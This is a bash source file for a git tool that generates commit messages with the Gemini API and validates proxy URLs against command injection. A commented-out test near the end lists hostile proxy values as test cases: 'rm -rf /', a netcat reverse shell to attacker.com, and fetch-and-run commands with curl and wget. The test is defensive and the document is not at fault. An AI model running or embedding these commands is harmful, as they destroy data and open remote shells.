#!/usr/bin/env bash

### AI Functions for commit message generation

# Google Gemini API endpoint
readonly GOOGLE_API_URL="https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent"

### Function to get AI API key from git config
# Returns: AI API key or empty if not set
function get_ai_api_key {
    get_config_value gitbasher.ai-api-key ""
}

### Function to set AI API key in git config
# $1: API key
function set_ai_api_key {
    set_config_value gitbasher.ai-api-key "$1"
}

### Function to get AI proxy URL from git config
# Returns: Proxy URL or empty if not set
function get_ai_proxy {
    get_config_value gitbasher.ai-proxy ""
}

### Function to set AI proxy URL in git config
# $1: Proxy URL (e.g., http://proxy.example.com:8080 or http://user:pass@proxy.example.com:8080)
function set_ai_proxy {
    set_config_value gitbasher.ai-proxy "$1"
}

### Function to get AI diff limit from git config
# Returns: Maximum number of diff lines to include in AI prompts (default: 50)
function get_ai_diff_limit {
    get_config_value gitbasher.ai-diff-limit "50"
}

### Function to set AI diff limit in git config
# $1: Maximum number of diff lines (recommended: 20-100)
function set_ai_diff_limit {
    set_config_value gitbasher.ai-diff-limit "$1"
}

### Function to get AI commit history limit from git config
# Returns: Maximum number of recent commits to include in AI prompts (default: 10)
function get_ai_commit_history_limit {
    get_config_value gitbasher.ai-commit-history-limit "10"
}

### Function to set AI commit history limit in git config
# $1: Maximum number of recent commits to include (recommended: 5-15)
function set_ai_commit_history_limit {
    set_config_value gitbasher.ai-commit-history-limit "$1"
}

### Function to mask API key for display, showing only last 4 characters
# $1: API key to mask
# Returns: Masked API key string with asterisks
function mask_api_key {
    local api_key="$1"
    if [ -z "$api_key" ]; then
        echo ""
        return
    fi
    
    local length=${#api_key}
    if [ $length -le 4 ]; then
        echo "$api_key"
        return
    fi
    
    local visible_chars="${api_key:(-4)}"
    echo "********${visible_chars}"
}

### Function to get limited diff content for AI prompts
# Returns: Diff content limited by lines and characters to save tokens
function get_limited_diff_for_ai {
    local diff_limit=$(get_ai_diff_limit)
    local max_chars=3000  # Approximate token limit (~750 tokens)
    
    # Get diff limited by lines
    local diff_content=$(git diff --cached | head -n "$diff_limit")
    
    # Further limit by character count to ensure we don't exceed token limits
    local char_count=${#diff_content}
    if [ "$char_count" -gt "$max_chars" ]; then
        diff_content=$(echo "$diff_content" | head -c "$max_chars")
        diff_content="${diff_content}... [truncated for token limit]"
    fi
    
    echo "$diff_content"
}

### Function to get recent commit messages for AI context
# Returns: Recent commit messages formatted for AI prompt
function get_recent_commit_messages_for_ai {
    local limit=$(get_ai_commit_history_limit)  # Use configurable limit
    local max_chars=1000  # Character limit to save tokens
    
    # Get recent commit messages (excluding merge commits)
    local recent_commits=$(git log --no-merges --pretty=format:"%s" -n "$limit" 2>/dev/null | head -c "$max_chars")
    
    if [ -z "$recent_commits" ]; then
        echo "No commit history available."
        return
    fi
    
    echo "$recent_commits"
}

### Function to validate and sanitize proxy URL to prevent command injection
# $1: proxy URL to validate
# Returns: 0 if valid, 1 if invalid
# Sets: validated_proxy_url variable with sanitized URL
function validate_proxy_url {
    local proxy_url="$1"
    validated_proxy_url=""
    
    if [ -z "$proxy_url" ]; then
        return 1
    fi
    
    # Remove any potential shell metacharacters and validate format
    # Allow only safe characters: alphanumeric, dots, hyphens, underscores, colons, slashes, @, %
    local cleaned_url=$(echo "$proxy_url" | sed 's/[^a-zA-Z0-9.:/@_%?&=-]//g')
    
    # Basic URL format validation for common proxy formats
    # http://[user:pass@]host:port
    # https://[user:pass@]host:port  
    # socks5://[user:pass@]host:port
    if [[ "$cleaned_url" =~ ^(https?|socks5)://([a-zA-Z0-9._%-]+(:([a-zA-Z0-9._%-]+))?@)?[a-zA-Z0-9.-]+:[0-9]+(/.*)?$ ]]; then
        validated_proxy_url="$cleaned_url"
        return 0
    elif [[ "$cleaned_url" =~ ^[a-zA-Z0-9.-]+:[0-9]+$ ]]; then
        # Allow simple host:port format (curl will assume http://)
        validated_proxy_url="$cleaned_url"
        return 0
    else
        return 1
    fi
}

### Function to securely call curl with API key
# This prevents API key exposure in process lists by using a subshell
# $1: proxy_url (can be empty)
# $2: api_key value
# $3: json_payload
function secure_curl_with_api_key {
    local proxy_url="$1"
    local api_key="$2"
    local json_payload="$3"
    
    # Execute curl in a subshell to minimize API key exposure
    (
        # Unset any potentially exported variables
        unset HISTFILE
        
        # Build curl command with proper array handling
        local curl_cmd=(
            curl -s -X POST
            --connect-timeout 30
            --max-time 60
        )
        
        # Add proxy if specified
        if [ -n "$proxy_url" ]; then
            curl_cmd+=(--proxy "$proxy_url")
        fi
        
        # Add remaining options
        curl_cmd+=(
            "$GOOGLE_API_URL"
            -H "Content-Type: application/json"
            -H "x-goog-api-key: $api_key"
            -d "$json_payload"
        )
        
        # Execute the curl command
        "${curl_cmd[@]}" 2>&1
    )
}

### Function to make request to Gemini API
# $1: prompt text
# Returns: AI response text
function call_gemini_api {
    # Set trap to clear sensitive variables on exit/interrupt
    trap 'clear_sensitive_vars' EXIT INT TERM
    
    local prompt="$1"
    local api_key=$(get_ai_api_key)
    
    if [ -z "$api_key" ]; then
        echo -e "${RED}AI API key not configured. Set it with: gitb config${ENDCOLOR}" >&2
        clear_sensitive_vars
        return 1
    fi
    
    # Escape special characters in prompt for JSON
    local escaped_prompt=$(echo "$prompt" | sed 's/\\/\\\\/g' | sed 's/"/\\"/g' | tr '\n' ' ' | sed 's/  */ /g')
    
    local json_payload="{
        \"contents\": [{
            \"parts\": [{
                \"text\": \"$escaped_prompt\"
            }]
        }],
        \"generationConfig\": {
            \"temperature\": 0.1,
            \"maxOutputTokens\": 100,
            \"topP\": 0.8,
            \"topK\": 10
        }
    }"
    
    # Make API request with optional proxy
    local proxy_url=$(get_ai_proxy)
    local safe_proxy_url=""
    local response=""
    
    if [ -n "$proxy_url" ]; then
        # Validate and sanitize proxy URL to prevent command injection
        if ! validate_proxy_url "$proxy_url"; then
            echo -e "${RED}Invalid proxy URL format: $proxy_url${ENDCOLOR}" >&2
            echo -e "${YELLOW}Expected format: protocol://host:port (e.g., http://proxy.example.com:8080)${ENDCOLOR}" >&2
            echo -e "${YELLOW}Or: host:port (e.g., proxy.example.com:8080)${ENDCOLOR}" >&2
            clear_sensitive_vars
            return 1
        fi
        
        # Use the validated proxy URL
        safe_proxy_url="$validated_proxy_url"
        response=$(secure_curl_with_api_key "$safe_proxy_url" "$api_key" "$json_payload")
    else
        response=$(secure_curl_with_api_key "" "$api_key" "$json_payload")
    fi
    
    local curl_exit_code=$?
    
    if [ $curl_exit_code -ne 0 ] || [ -z "$response" ]; then
        echo
        echo -e "${RED}Failed to connect to AI service${ENDCOLOR}" >&2
        echo -e "${YELLOW}Debug Information:${ENDCOLOR}" >&2
        echo -e "  • Curl exit code: $curl_exit_code" >&2
        echo -e "  • Response length: ${#response}" >&2
        
        if [ -n "$safe_proxy_url" ]; then
            echo -e "  • Using proxy: $safe_proxy_url" >&2
            echo -e "${YELLOW}Proxy troubleshooting:${ENDCOLOR}" >&2
            echo -e "  • Test proxy: ${BOLD}curl --proxy '$safe_proxy_url' --connect-timeout 10 https://ifconfig.me${ENDCOLOR}" >&2
            echo -e "  • Test direct: ${BOLD}curl --connect-timeout 10 https://ifconfig.me${ENDCOLOR}" >&2
            echo -e "  • Configure different proxy: gitb cfg proxy" >&2
            
            # Test proxy connectivity
            echo -e "${YELLOW}Testing proxy connectivity...${ENDCOLOR}" >&2
            local proxy_test=$(curl --proxy "$safe_proxy_url" --connect-timeout 5 --max-time 10 -s https://ifconfig.me 2>&1)
            local proxy_test_code=$?
            if [ $proxy_test_code -eq 0 ]; then
                echo -e "  ✅ Proxy connection: Working" >&2
                echo -e "  📍 Your IP via proxy: $(echo "$proxy_test" | head -1)" >&2
            else
                echo -e "  ❌ Proxy connection: Failed (exit code: $proxy_test_code)" >&2
                echo -e "  📝 Error: $proxy_test" >&2
            fi
        else
            echo -e "  • No proxy configured" >&2
            echo -e "${YELLOW}Direct connection troubleshooting:${ENDCOLOR}" >&2
            echo -e "  • Test connection: ${BOLD}curl --connect-timeout 10 https://generativelanguage.googleapis.com${ENDCOLOR}" >&2
            
            # Test direct connectivity to Google API
            echo -e "${YELLOW}Testing direct connectivity to Google AI...${ENDCOLOR}" >&2
            local direct_test=$(curl --connect-timeout 5 --max-time 10 -s -I https://generativelanguage.googleapis.com 2>&1)
            local direct_test_code=$?
            if [ $direct_test_code -eq 0 ]; then
                echo -e "  ✅ Google AI endpoint: Reachable" >&2
            else
                echo -e "  ❌ Google AI endpoint: Failed (exit code: $direct_test_code)" >&2
                echo -e "  📝 Error: $(echo "$direct_test" | head -1)" >&2
                echo -e "  💡 Consider configuring a proxy: gitb cfg proxy" >&2
            fi
        fi
        
        # Show partial response if any
        if [ -n "$response" ]; then
            echo -e "${YELLOW}Partial response received:${ENDCOLOR}" >&2
            echo "$response" | head -3 >&2
            echo -e "${YELLOW}...${ENDCOLOR}" >&2
        fi
        
        clear_sensitive_vars
        return 1
    fi
    
    # Debug: show raw response (uncomment for debugging)
    # echo "DEBUG: Raw response: $response" >&2
    
    # Check for API error - handle multi-line JSON properly
    local has_error=$(echo "$response" | grep -q '"error"' && echo "true" || echo "false")
    
    if [ "$has_error" = "true" ]; then
        # Extract error details using grep and more robust parsing
        local error_code=$(echo "$response" | grep -o '"code"[[:space:]]*:[[:space:]]*[0-9]*' | grep -o '[0-9]*')
        local error_message=$(echo "$response" | grep -o '"message"[[:space:]]*:[[:space:]]*"[^"]*"' | sed 's/"message"[[:space:]]*:[[:space:]]*"\([^"]*\)"/\1/')
        
        echo -e "${RED}AI API Error${ENDCOLOR}" >&2
        if [ -n "$error_code" ]; then
            echo -e "${RED}Error Code: $error_code${ENDCOLOR}" >&2
        fi
        if [ -n "$error_message" ]; then
            echo -e "${RED}Error Message: $error_message${ENDCOLOR}" >&2
        fi
        
        # Provide helpful suggestions based on error type
        echo >&2
        case "$error_code" in
            400)
                if [[ "$error_message" == *"location is not supported"* ]]; then
                    echo -e "${YELLOW}⚠️  Geographic restriction: Google's Gemini API is not available in your region.${ENDCOLOR}" >&2
                    echo -e "${YELLOW}Solutions:${ENDCOLOR}" >&2
                    echo -e "${YELLOW}  • Configure proxy with: gitb cfg proxy${ENDCOLOR}" >&2
                    echo -e "${YELLOW}  • Use a VPN to connect from a supported region${ENDCOLOR}" >&2
                    echo -e "${YELLOW}  • Use manual commit messages for now${ENDCOLOR}" >&2
                else
                    echo -e "${YELLOW}⚠️  Bad request: Check your API configuration or prompt format.${ENDCOLOR}" >&2
                    echo -e "${YELLOW}Solutions:${ENDCOLOR}" >&2
                    echo -e "${YELLOW}  • Verify your API key is correct${ENDCOLOR}" >&2
                    echo -e "${YELLOW}  • Try again with a smaller commit diff${ENDCOLOR}" >&2
                fi
                ;;
            401|403)
                echo -e "${YELLOW}🔐 Authentication error: Invalid or expired API key.${ENDCOLOR}" >&2
                echo -e "${YELLOW}Solutions:${ENDCOLOR}" >&2
                echo -e "${YELLOW}  • Check your API key with: gitb cfg ai${ENDCOLOR}" >&2
                echo -e "${YELLOW}  • Generate a new API key at: https://makersuite.google.com/app/apikey${ENDCOLOR}" >&2
                echo -e "${YELLOW}  • Ensure your API key has proper permissions${ENDCOLOR}" >&2
                ;;
            429)
                echo -e "${YELLOW}⏱️  Rate limit exceeded: Too many requests.${ENDCOLOR}" >&2
                echo -e "${YELLOW}Solutions:${ENDCOLOR}" >&2
                echo -e "${YELLOW}  • Wait a few minutes and try again${ENDCOLOR}" >&2
                echo -e "${YELLOW}  • Consider upgrading your API plan for higher limits${ENDCOLOR}" >&2
                ;;
            500|502)
                echo -e "${YELLOW}🔧 Server error: Google's service is experiencing issues.${ENDCOLOR}" >&2
                echo -e "${YELLOW}Solutions:${ENDCOLOR}" >&2
                echo -e "${YELLOW}  • Try again in a few minutes${ENDCOLOR}" >&2
                echo -e "${YELLOW}  • Check Google's API status page${ENDCOLOR}" >&2
                ;;
            503)
                echo -e "${YELLOW}📊 Service overloaded: Google's servers are busy.${ENDCOLOR}" >&2
                echo -e "${YELLOW}Solutions:${ENDCOLOR}" >&2
                echo -e "${YELLOW}  • Try again in a few minutes${ENDCOLOR}" >&2
                echo -e "${YELLOW}  • Retry during off-peak hours${ENDCOLOR}" >&2
                ;;
            *)
                # Check for specific error message patterns when code is unclear
                if [[ "$error_message" == *"suspended"* ]]; then
                    echo -e "${YELLOW}🚫 Account suspended: Your API access has been suspended.${ENDCOLOR}" >&2
                    echo -e "${YELLOW}Solutions:${ENDCOLOR}" >&2
                    echo -e "${YELLOW}  • Contact Google Support to resolve account issues${ENDCOLOR}" >&2
                    echo -e "${YELLOW}  • Check your Google Cloud Console for notices${ENDCOLOR}" >&2
                elif [[ "$error_message" == *"location is not supported"* ]]; then
                    echo -e "${YELLOW}⚠️  Geographic restriction: Google's Gemini API is not available in your region.${ENDCOLOR}" >&2
                    echo -e "${YELLOW}Solutions:${ENDCOLOR}" >&2
                    echo -e "${YELLOW}  • Configure proxy with: gitb cfg proxy${ENDCOLOR}" >&2
                    echo -e "${YELLOW}  • Use a VPN to connect from a supported region${ENDCOLOR}" >&2
                    echo -e "${YELLOW}  • Use manual commit messages for now${ENDCOLOR}" >&2
                else
                    echo -e "${YELLOW}❓ Unknown error occurred.${ENDCOLOR}" >&2
                    echo -e "${YELLOW}Solutions:${ENDCOLOR}" >&2
                    echo -e "${YELLOW}  • Check Google's API documentation${ENDCOLOR}" >&2
                    echo -e "${YELLOW}  • Try again later${ENDCOLOR}" >&2
                fi
                ;;
        esac
        
        clear_sensitive_vars
        return 1
    fi
    
    # More robust JSON parsing for Gemini API response
    # Try different patterns to extract the text content
    local ai_response=""
    
    # Pattern 1: Standard text field
    ai_response=$(echo "$response" | sed -n 's/.*"text"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p' | head -1)
    
    # Pattern 2: If that fails, try extracting from candidates array
    if [ -z "$ai_response" ]; then
        ai_response=$(echo "$response" | sed -n 's/.*"candidates".*"text"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p' | head -1)
    fi
    
    # Pattern 3: Try with content -> parts -> text structure
    if [ -z "$ai_response" ]; then
        ai_response=$(echo "$response" | sed -n 's/.*"content".*"parts".*"text"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p' | head -1)
    fi
    
    # Clean up escaped characters
    if [ -n "$ai_response" ]; then
        ai_response=$(echo "$ai_response" | sed 's/\\n/\n/g' | sed 's/\\"/"/g' | sed 's/\\\\//g')
    fi
    
    if [ -z "$ai_response" ]; then
        echo -e "${RED}Failed to parse AI response${ENDCOLOR}" >&2
        echo -e "${YELLOW}Raw API response:${ENDCOLOR}" >&2
        echo "$response" | head -5 >&2
        echo -e "${YELLOW}...${ENDCOLOR}" >&2
        echo -e "${YELLOW}To see full response, enable debug mode in ai.sh${ENDCOLOR}" >&2
        # Clear sensitive variables before returning
        clear_sensitive_vars
        return 1
    fi
    
    # Clear sensitive variables before returning success
    clear_sensitive_vars
    echo "$ai_response"
}


### Function to check if AI tools are available
# Returns: 0 if available, 1 if not
function check_ai_available {
    # Check if curl is available
    if ! command -v curl >/dev/null 2>&1; then
        echo -e "${RED}curl is required for AI functionality but not installed${ENDCOLOR}" >&2
        return 1
    fi
    
    # Check if API key is configured
    local api_key=$(get_ai_api_key)
    if [ -z "$api_key" ]; then
        echo -e "${RED}AI API key not configured${ENDCOLOR}" >&2
        echo -e "${YELLOW}Configure it with: gitb cfg ai${ENDCOLOR}" >&2
        return 1
    fi
    
    return 0
}

### Function to generate commit message using AI
# Uses staged files and their diff to generate conventional commit message
# Returns: Generated commit message in format "type(scope): subject"
function generate_ai_commit_message {
    local staged_files=$(git diff --name-only --cached)
    
    if [ -z "$staged_files" ]; then
        echo -e "${RED}No staged files found${ENDCOLOR}" >&2
        return 1
    fi
    
    # Get the diff for staged files (limited to save tokens)
    local diff_content=$(git diff --cached --stat)
    local diff_details=$(get_limited_diff_for_ai)
    local recent_commits=$(get_recent_commit_messages_for_ai)
    
    # Create prompt for AI
    local prompt="Analyze the following git changes and generate a conventional commit message in the format 'type(scope): subject'.

Available types:
- feat: new feature, logic change or performance improvement
- fix: small changes, bug fix
- refactor: code change that neither fixes a bug nor adds a feature, style changes
- test: adding missing tests or changing existing tests
- build: changes that affect the build system or external dependencies
- ci: changes to CI configuration files and scripts
- chore: maintenance and housekeeping
- docs: documentation changes

Recent commit messages from this repository (for style reference):
$recent_commits

Staged files:
$staged_files

File changes summary:
$diff_content

Code changes (partial):
$diff_details

Generate ONLY the commit message in the format 'type(scope): subject'. The subject should:
- Use imperative mood (e.g., 'add', 'fix', 'update')
- Be lowercase
- Not end with a period
- Be concise and descriptive
- Follow the style and patterns from the recent commits shown above

If you can determine a meaningful scope from the file paths, include it. Otherwise, omit the scope.

Write ONLY the commit header in the format 'type(scope): subject', do not write body or foote after a new line!

Respond with only the commit message, nothing else."

    call_gemini_api "$prompt"
}


### Function to generate commit message using AI
# $1: commit type and scope
# Uses staged files and their diff to generate conventional commit message
# Returns: Generated commit message in format "type(scope): subject"
function generate_ai_commit_message_subject {
    local staged_files=$(git diff --name-only --cached)
    
    if [ -z "$staged_files" ]; then
        echo -e "${RED}No staged files found${ENDCOLOR}" >&2
        return 1
    fi
    
    # Get the diff for staged files (limited to save tokens)
    local diff_content=$(git diff --cached --stat)
    local diff_details=$(get_limited_diff_for_ai)
    local recent_commits=$(get_recent_commit_messages_for_ai)
    
    # Create prompt for AI
    local prompt="Analyze the following git changes and generate a conventional commit message that will be after appended to $1.

Recent commit messages from this repository (for style reference):
$recent_commits

Staged files:
$staged_files

File changes summary:
$diff_content

Code changes (partial):
$diff_details

Generate ONLY the commit message. The message should:
- Use imperative mood (e.g., 'add', 'fix', 'update')
- Be lowercase
- Not end with a period
- Be concise and descriptive
- Follow the style and patterns from the recent commits shown above

Write ONLY the commit message, do not write body or footer.

Respond with only the commit message without any other text, nothing else."

    call_gemini_api "$prompt"
}


### Function to generate commit message using AI
# Uses staged files and their diff to generate conventional commit message
# Returns: Generated commit message in format "type(scope): subject"
function generate_ai_commit_message_full {
    local staged_files=$(git diff --name-only --cached)
    
    if [ -z "$staged_files" ]; then
        echo -e "${RED}No staged files found${ENDCOLOR}" >&2
        return 1
    fi
    
    # Get the diff for staged files (limited to save tokens)
    local diff_content=$(git diff --cached --stat)
    local diff_details=$(get_limited_diff_for_ai)
    local recent_commits=$(get_recent_commit_messages_for_ai)
    
    # Create prompt for AI
    local prompt="Analyze the following git changes and generate a conventional commit message in the format 'type(scope): subject' with body.

Write a body for the commit message, where you can explain why you are making the change. The length of the body should be 1-2 sentences, not more.

Available types:
- feat: new feature, logic change or performance improvement
- fix: small changes, bug fix
- refactor: code change that neither fixes a bug nor adds a feature, style changes
- test: adding missing tests or changing existing tests
- build: changes that affect the build system or external dependencies
- ci: changes to CI configuration files and scripts
- chore: maintenance and housekeeping
- docs: documentation changes

Recent commit messages from this repository (for style reference):
$recent_commits

Staged files:
$staged_files

File changes summary:
$diff_content

Code changes (partial):
$diff_details

Generate ONLY the commit message in the format 'type(scope): subject' with body. The subject should:
- Use imperative mood (e.g., 'add', 'fix', 'update')
- Be lowercase
- Not end with a period
- Be concise and descriptive
- Follow the style and patterns from the recent commits shown above

If you can determine a meaningful scope from the file paths, include it. Otherwise, omit the scope.

The body should explain why you are making the change. The length of the body should be 1-2 sentences, not more.

Respond with only the full commit message, nothing else."

    call_gemini_api "$prompt"
}

### Function to test proxy URL validation (for development/testing)
# Uncomment and run this function to test the validation
# function test_proxy_validation {
#     echo "Testing proxy URL validation..."
#     
#     # Valid URLs - should pass
#     local test_urls=(
#         "http://proxy.example.com:8080"
#         "https://proxy.example.com:8080" 
#         "socks5://proxy.example.com:1080"
#         "proxy.example.com:8080"
#         "http://user:pass@proxy.example.com:8080"
#     )
#     
#     # Invalid/malicious URLs - should fail
#     local malicious_urls=(
#         "http://proxy.com; rm -rf /; #"
#         "proxy.com:8080 && curl malicious.com"
#         "proxy.com:8080|nc -e /bin/sh attacker.com 4444"
#         "\$(curl malicious.com)"
#         "proxy.com:8080; wget evil.sh; bash evil.sh"
#     )
#     
#     echo "Testing valid URLs:"
#     for url in "${test_urls[@]}"; do
#         if validate_proxy_url "$url"; then
#             echo "✓ PASS: $url -> $validated_proxy_url"
#         else
#             echo "✗ FAIL: $url (should have passed)"
#         fi
#     done
#     
#     echo -e "\nTesting malicious URLs:"
#     for url in "${malicious_urls[@]}"; do
#         if validate_proxy_url "$url"; then
#             echo "✗ SECURITY RISK: $url -> $validated_proxy_url (should have failed!)"
#         else
#             echo "✓ BLOCKED: $url"
#         fi
#     done
# }

### Function to securely clear sensitive variables
# This helps prevent API key exposure via memory dumps or env vars
function clear_sensitive_vars {
    # Clear local API key variables
    api_key=""
    ai_key_input=""
    validated_proxy_url=""
    
    # Clear from environment if accidentally exported
    unset api_key 2>/dev/null
    unset ai_key_input 2>/dev/null
    unset AI_API_KEY 2>/dev/null
    unset GEMINI_API_KEY 2>/dev/null
    
    # Force garbage collection of shell variables (bash-specific)
    if [ -n "$BASH_VERSION" ]; then
        hash -r 2>/dev/null
    fi
}
